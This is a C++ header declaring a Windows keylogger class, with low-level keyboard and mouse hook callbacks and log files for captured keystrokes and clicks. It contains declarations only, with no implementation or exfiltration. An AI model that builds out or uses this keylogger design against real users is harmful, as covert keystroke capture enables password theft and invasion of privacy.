#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <sstream>
#include <chrono>
#include <iomanip>
#include <locale>
#include <vector>
#include <ctime>
#include <thread>

class Keylogger {
public:
    Keylogger();
    ~Keylogger();
    void StartLogging();
    void StopLogging();
    void SetKeyboardHook();
    void SetMouseHook();

private:
    static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    void LogKeyboardEvent(PKBDLLHOOKSTRUCT p);
    void LogMouseEvent(WPARAM wParam);
    std::ofstream logFile;
    std::ofstream keyboardFile;
    std::ostringstream logStream;
    std::ostringstream keyboardStream;
    static Keylogger* instance;
    HHOOK keyboardHook = NULL;
    HHOOK mouseHook = NULL;

};

#endif // KEYLOGGER_H
